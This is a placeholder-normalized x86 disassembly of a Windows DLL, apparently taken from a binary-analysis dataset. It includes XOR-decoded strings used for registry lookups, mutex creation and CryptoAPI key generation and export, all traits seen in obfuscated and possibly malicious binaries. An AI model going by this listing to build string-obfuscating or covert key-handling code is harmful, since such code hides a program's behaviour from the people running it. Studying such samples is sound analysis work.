jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] eax
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ebp + 0x8 ] ecx
jmp r-xdata
lea esp [ esp ]
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_100218f0
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ r--data ]
movsx ecx [ eax ]
xor ecx 0x4e
and ecx 0xff
lea eax [ ebp - 0x210 ]
push eax
xor edx edx
mov [ ebp - 0x210 ] cx
mov ecx eax
push ecx
mov [ ebp - 0x20e ] dx
mov edx eax
mov eax [ rw-data ]
push edx
push 0x1
push 0x1
push eax
lea eax [ ebp - 0x20c ]
call sub_10066ff0
test eax eax
je r-xdata
lea eax [ ebp - 0x20c ]
lea edx [ eax + 0x2 ]
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x20c ]
push ecx
lea ecx [ esi + 0x94 ]
call sub_1005ddc0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_100219a0
push ebp
mov ebp esp
sub esp 0x30c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfffc
and edx 0xff
mov [ ebp + eax * 2 - 0x44 ] dx
inc eax
cmp eax 0x19
jb r-xdata
push esi
mov esi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0x304 ]
push ecx
push 0x1
xor eax eax
push eax
lea edx [ ebp - 0x44 ]
push edx
push 0x80000002
mov [ ebp - 0x12 ] ax
call esi
test eax eax
jne r-xdata
push ebx
push edi
lea edx [ ebp - 0xa0 ]
mov eax 0x1f
call sub_100367b0
lea ecx [ ebp - 0x304 ]
push ecx
push 0x1
push 0x0
push edx
push 0x80000002
call esi
mov ebx [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x304 ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xf8 ]
mov eax 0x3
call sub_100367b0
lea ecx [ ebp - 0x304 ]
push ecx
push 0x1
push 0x0
push edx
push 0x80000002
call esi
test eax eax
jne r-xdata
xor eax eax
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x300 ]
[ edi ]
lea edx [ ebp - 0x68 ]
mov eax 0x14
mov [ ebp - 0x308 ] 0x206
call sub_100367b0
lea eax [ ebp - 0x308 ]
push eax
mov eax [ ebp - 0x304 ]
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop ebx
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x300 ]
[ edi ]
lea edx [ ebp - 0x30c ]
mov eax 0x2b
mov [ ebp - 0x308 ] 0x206
call sub_100367b0
lea eax [ ebp - 0x308 ]
push eax
mov eax [ ebp - 0x304 ]
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call ebx
test eax eax
jne r-xdata
lea edx [ ebp - 0x300 ]
push edx
call [ CharUpperW@IAT ]
lea edx [ ebp - 0x10 ]
mov eax 0x2a
call sub_100367b0
mov eax edx
push eax
lea ecx [ ebp - 0x300 ]
push ecx
call sub_1005f3a1
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ ebp - 0x304 ]
push ecx
jmp r-xdata
lea edx [ ebp - 0x300 ]
push edx
call [ CharUpperW@IAT ]
lea edx [ ebp - 0x10 ]
mov eax 0x23
call sub_100367b0
mov eax edx
push eax
lea ecx [ ebp - 0x300 ]
push ecx
call sub_1005f3a1
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp - 0x304 ]
push edx
call [ RegCloseKey@IAT ]
pop edi
pop ebx
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x304 ]
push eax
call [ RegCloseKey@IAT ]
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x304 ]
push eax
sub_10021bf0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ edi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
mov edx [ edi ]
mov [ esi ] edx
mov [ edi ] 0x0
mov ecx [ edi + 0x10 ]
inc ecx
push ecx
push edi
push esi
call sub_1007ec90
add esp 0xc
jmp r-xdata
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov ecx [ edi + 0x14 ]
mov [ esi + 0x14 ] ecx
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
sub_10021c66
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10061dab
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
pop ecx
sub_10021ca0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
push esi
push 0xffffffff
push 0x0
push eax
push 0x0
mov [ ebp - 0x4 ] 0x0
call sub_10012630
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_10021bf0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_10021cf0
mov edx [ edi ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax edx
push ebx
lea ebx [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax ebx
sar eax 0x1
push eax
push edx
mov ecx esi
call sub_1005ddc0
mov ecx [ edi + 0x4 ]
mov [ esi + 0x1c ] ecx
mov edx [ edi + 0x8 ]
mov [ esi + 0x20 ] edx
mov eax esi
pop ebx
retn
sub_10021d60
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
mov edx [ esi + 0x4 ]
xor eax eax
test edx edx
je r-xdata
pop esi
pop ebp
retn
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ esi ]
mov ecx edi
lea esp [ esp ]
cmp eax 0xffffffff
je r-xdata
inc eax
add ecx 0x4
cmp eax edx
jb r-xdata
pop edi
pop ebx
lea ecx [ edi + eax * 4 ]
sub edx eax
lea eax [ edx * 4 - 0x4 ]
push eax
lea edx [ ecx + 0x4 ]
push edx
push ecx
call sub_1007ec90
add esp 0xc
dec [ esi + 0x4 ]
cmp [ ecx ] ebx
je r-xdata
pop edi
pop ebx
pop esi
pop ebp
retn
sub_10021dc0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
xor eax eax
push 0x11c
push eax
lea edi [ esi + 0x4 ]
push edi
mov ebx ecx
mov [ esi + 0x11b0 ] eax
mov [ esi + 0x11b4 ] eax
call sub_1007f940
add esp 0xc
push edi
mov [ edi ] 0x11c
call [ GetVersionExW@IAT ]
call [ GetProcessHeap@IAT ]
push 0x104
mov [ esi ] eax
lea eax [ esi + 0x73c ]
push 0x0
push eax
call sub_1007f940
push 0x104
lea ecx [ esi + 0x944 ]
push 0x0
push ecx
call sub_1007f940
push 0x104
lea edx [ esi + 0xb4c ]
push 0x0
push edx
call sub_1007f940
xor eax eax
mov [ esi + 0xd5c ] eax
mov [ esi + 0xd60 ] eax
mov [ esi + 0xd64 ] eax
mov [ esi + 0xd68 ] eax
mov [ esi + 0xd7c ] eax
mov [ esi + 0xd80 ] eax
mov [ esi + 0xd84 ] eax
mov [ esi + 0xd88 ] eax
push 0x104
push eax
mov [ esi + 0xd8c ] ax
lea eax [ esi + 0xda0 ]
push eax
call sub_1007f940
push 0x104
lea ecx [ esi + 0xfa8 ]
push 0x0
push ecx
call sub_1007f940
push 0x104
lea edi [ esi + 0x534 ]
push 0x0
push edi
call sub_1007f940
add esp 0x48
push 0x104
lea edx [ esi + 0x124 ]
push 0x0
push edx
call sub_1007f940
push 0x104
lea eax [ esi + 0x32c ]
push 0x0
push eax
call sub_1007f940
xor eax eax
add esp 0x18
mov [ esi + 0xd54 ] eax
mov [ esi + 0xd58 ] eax
cmp ebx eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov [ esi + 0x120 ] ebx
cmp [ ebx + 0x1596c ] 0x1
jne r-xdata
lea edx [ ebx + 0xc4 ]
mov ebx 0x104
mov eax edi
sub edx edi
nop
test ebx ebx
jne r-xdata
movzx ecx [ edx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
lea edx [ ebp - 0x18 ]
mov eax 0x12
call sub_10049e00
push 0x104
lea eax [ esi + 0x32c ]
push eax
mov eax edx
push eax
call [ ExpandEnvironmentStringsW@IAT ]
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec ebx
jne r-xdata
lea ecx [ ebx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
sub_10021f70
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
push ecx
push edx
call eax
add esp 0x8
pop ebp
retn
sub_10021f90
push ebp
mov ebp esp
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x92492493
imul esi
mov eax [ ebp + 0x8 ]
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
mov edx 0x9249249
sub edx eax
push edi
cmp edx esi
jae r-xdata
mov edi [ ecx + 0x8 ]
add esi eax
sub edi ebx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_1000831a
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx eax
shr edx 0x1
mov edi 0x9249249
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_10022630
mov eax esi
cmp eax esi
jae r-xdata
sub_1002202c
push 0x18
push r--data
call sub_1007fb20
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_1004067e
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_10058c10
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100221bc
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_1007fb65
retn
push 0x40
push 0x20
call sub_10067d3a
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_10013b34
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_10058c10
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_100220fe
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_100221d0
push ebp
mov ebp esp
sub esp 0x118
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor edi edi
mov esi ecx
mov ecx [ r--data ]
mov ebx edx
mov [ ebp - 0xf8 ] edi
mov [ ebp - 0x104 ] edi
xor eax eax
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xfffb
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x2
jb r-xdata
lea ecx [ ebp - 0x104 ]
push ecx
lea edx [ ebp - 0xc ]
xor eax eax
push edx
mov [ ebp - 0x8 ] ax
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0xe3
mov [ ebp - 0xfc ] edi
call sub_10053240
lea eax [ ebp - 0xfc ]
push eax
mov ecx edx
push ecx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xf4 ]
mov eax 0x119
call sub_10053240
mov [ ebp - 0xf8 ] 0x1
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax 0xa7
mov [ ebp - 0x108 ] edi
call sub_10053240
lea edx [ ebp - 0x108 ]
push edx
lea eax [ ebp - 0x18 ]
push eax
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0xfc ] edi
mov eax [ ebp - 0x104 ]
mov esi [ SysFreeString@IAT ]
push eax
call esi
mov ecx [ ebp - 0x108 ]
push ecx
call esi
mov edx [ ebp - 0x110 ]
push edx
call esi
mov eax [ ebp - 0x118 ]
push eax
call esi
mov ecx [ ebp - 0x114 ]
push ecx
call esi
mov edx [ ebp - 0x10c ]
push edx
call esi
mov eax [ ebp - 0x100 ]
push eax
call esi
mov eax [ ebp - 0xfc ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x48 ]
mov eax 0xec
mov [ ebp - 0x110 ] edi
call sub_10053240
lea ecx [ ebp - 0x110 ]
push ecx
push edx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xec ]
mov eax 0x103
call sub_10053240
mov [ ebp - 0xf8 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0xf8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
push eax
call esi
lea edx [ ebp - 0x5c ]
mov eax 0x90
mov [ ebp - 0x118 ] edi
call sub_10053240
lea eax [ ebp - 0x118 ]
push eax
mov ecx edx
push ecx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xf4 ]
mov eax 0xf9
call sub_10053240
mov [ ebp - 0xf8 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0xc2
mov [ ebp - 0x114 ] edi
call sub_10053240
lea edx [ ebp - 0x114 ]
push edx
lea eax [ ebp - 0x70 ]
push eax
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xf4 ]
mov eax 0x46
call sub_10053240
mov [ ebp - 0xf8 ] 0x4
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x101
mov [ ebp - 0x10c ] edi
call sub_10053240
lea ecx [ ebp - 0x10c ]
push ecx
push edx
call sub_100724e0
lea edx [ ebp - 0x90 ]
mov eax 0xd7
mov [ ebp - 0x100 ] edi
call sub_10053240
lea eax [ ebp - 0x100 ]
push eax
mov ecx edx
push ecx
call sub_100724e0
add esp 0x10
push 0x24
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0xf4 ]
mov eax 0x37
call sub_10053240
xor eax eax
mov edx [ ebp - 0x100 ]
mov ecx [ ebp - 0x10c ]
push edx
mov edx [ ebp - 0x114 ]
push ecx
mov ecx [ ebp - 0x108 ]
push edx
mov edx [ ebp - 0x104 ]
push ecx
mov ecx [ ebp - 0x110 ]
push edx
mov edx [ ebp - 0x118 ]
mov esi eax
call sub_1003e9a0
jmp r-xdata
mov edi eax
call sub_10070390
xor edi edi
mov [ ebx ] eax
mov ebx [ ebp - 0xfc ]
cmp ebx edi
je r-xdata
sub_100224ad
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
mov esi [ ebp + 0x8 ]
test ecx 0xfcf0fce0
je r-xdata
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_10067335
call sub_10067335
mov [ esi ] eax
jmp r-xdata
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
call sub_100427ff
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_10067335
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_1002250c
push ebp
mov ebp esp
push ecx
push ecx
push edi
xor edi edi
push edi
push 0x1
push r--data
push edi
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push ebx
push esi
lea eax [ ebp - 0x4 ]
push eax
push 0x800003
push 0x6801
push [ ebp - 0x8 ]
call [ CryptGenKey@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
mov ebx [ ebp + 0xc ]
mov esi [ CryptExportKey@IAT ]
push ebx
push edi
push edi
push 0x8
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push 0x2
xor eax eax
inc eax
lea eax [ ebp - 0x8 ]
push eax
call sub_100375b7
jmp r-xdata
push [ ebx ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
pop edi
leave
retn 0x8
xor eax eax
inc eax
cmp eax edi
je r-xdata
push ebx
push eax
push edi
push 0x8
push edi
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
pop esi
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ CryptDestroyKey@IAT ]
push 0x5
jmp r-xdata
push edi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
mov eax esi
pop esi
pop ebx
jmp r-xdata
sub_100225fd
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_100816f3
add esp 0x14
pop ebp
retn
sub_10022630
push ebp
mov ebp esp
push 0xffffffff
push sub_10088480
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x9249249
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ebx
jae r-xdata
push r--data
call sub_1000831a
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edi [ esi + 0xc ]
push ebx
mov ecx edi
call sub_10016470
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ebx
push 0x0
push edi
push eax
push ecx
push edx
mov [ ebp - 0x14 ] eax
call sub_10007b80
mov ebx [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add esp 0x18
add edi edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax * 8 ]
sub ecx eax
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 4 ]
lea ecx [ edi * 8 ]
sub ecx edi
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov ecx [ ebp + 0x8 ]
push ecx
lea eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x4 ]
push eax
push ebx
call sub_10069cd0
mov edx [ esi ]
push edx
call sub_100187af
add esp 0x14
sub_10022749
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_1003ddf5
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_10035c1d
jmp r-xdata
sub_10022780
push 0x4
push 0x0
mov [ esi ] eax
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
inc [ eax ]
mov eax esi
retn
mov [ eax ] 0x0
mov [ esi + 0x4 ] eax
inc [ eax ]
mov eax esi
retn
sub_100227c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087c45
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x10 ]
mov [ edi ] bl
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x60 ] edx
mov [ ebp - 0x54 ] ecx
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
mov edx 0x7
xor ecx ecx
mov [ edi + 0x40 ] edx
mov [ edi + 0x3c ] ebx
mov [ edi + 0x2c ] cx
mov [ edi + 0x5c ] edx
mov [ edi + 0x58 ] ebx
mov [ edi + 0x48 ] cx
mov [ edi + 0x78 ] edx
mov [ edi + 0x74 ] ebx
mov [ edi + 0x64 ] cx
lea ecx [ edi + 0x80 ]
mov [ ebp - 0x4 ] 0x3
push 0xffffffff
mov [ ecx + 0x14 ] edx
push ebx
xor edx edx
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_100404a0
mov [ edi + 0xb4 ] 0xf
mov [ edi + 0xb0 ] ebx
mov [ edi + 0xa0 ] bl
mov [ edi + 0xbc ] ebx
mov [ edi + 0xc0 ] 0x3
mov [ edi + 0xc4 ] ebx
mov [ edi + 0xc8 ] ebx
mov [ edi + 0xcc ] ebx
mov [ ebp - 0x4 ] 0x6
push 0x18
mov [ edi + 0xdc ] ebx
call sub_1001f84c
add esp 0x4
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x58 ]
push ecx
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x58 ] ebx
call sub_10069ac6
push r--data
lea edx [ ebp - 0x6c ]
push edx
mov [ ebp - 0x6c ] r--data
call sub_10024fe9
int3
mov [ edi + 0xd8 ] eax
mov [ eax ] eax
mov eax [ edi + 0xd8 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0xd8 ]
mov [ eax + 0x8 ] eax
mov eax [ edi + 0xd8 ]
mov [ eax + 0x14 ] 0x1
mov ecx [ edi + 0xd8 ]
mov [ ecx + 0x15 ] 0x1
mov [ ebp - 0x4 ] 0x7
fldz
fst [ edi + 0xf8 ]
mov [ edi + 0xe8 ] ebx
fstp [ edi + 0xfc ]
mov [ edi + 0xec ] 0x1
mov [ edi + 0xf0 ] ebx
mov [ edi + 0xf4 ] ebx
mov [ ebp - 0x50 ] ebx
cmp esi ebx
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp - 0x4c ]
lea esi [ ebp - 0x50 ]
call sub_10072870
cmp eax ebx
jl r-xdata
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x4c ]
push eax
xor edx edx
push ecx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] dx
call sub_1005ddc0
mov [ ebp - 0x4 ] 0x8
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x1c ]
push eax
lea esi [ ebp - 0x48 ]
call sub_1006f790
add esp 0x4
push eax
lea ecx [ edi + 0xa0 ]
mov [ ebp - 0x4 ] 0x9
call sub_10021bf0
mov [ ebp - 0x4 ] 0x8
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
lea eax [ ebp - 0x2c ]
lea eax [ edi + 0xe4 ]
push eax
call sub_10065cb8
add esp 0x4
lea ecx [ edi + 0x14 ]
push ecx
call [ InitializeCriticalSection@IAT ]
mov edx [ ebp - 0x5c ]
cmp edx ebx
je r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_100187af
add esp 0x4
push ebx
push ebx
push ebx
call [ CreateMutexW@IAT ]
mov [ edi + 0xf4 ] eax
cmp eax ebx
jne r-xdata
mov eax edx
lea esi [ eax + 0x2 ]
lea ecx [ ecx ]
cmp [ ebp - 0x18 ] 0x8
mov [ edi ] 0x1
jb r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ edi + 0x2c ]
call sub_1005ddc0
mov edx [ ebp - 0x60 ]
cmp edx ebx
je r-xdata
mov eax [ ebp - 0x2c ]
push eax
mov edx [ ebp - 0x2c ]
push edx
jmp r-xdata
mov eax edx
lea esi [ eax + 0x2 ]
call sub_100187af
add esp 0x4
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ edi + 0x48 ]
call sub_1005ddc0
mov edx [ ebp - 0x54 ]
cmp edx ebx
je r-xdata
lea eax [ edi + 0x64 ]
push eax
call sub_100453a0
sub_10022a76
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push ebx
push 0x1
push ebx
push ebx
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push esi
push edi
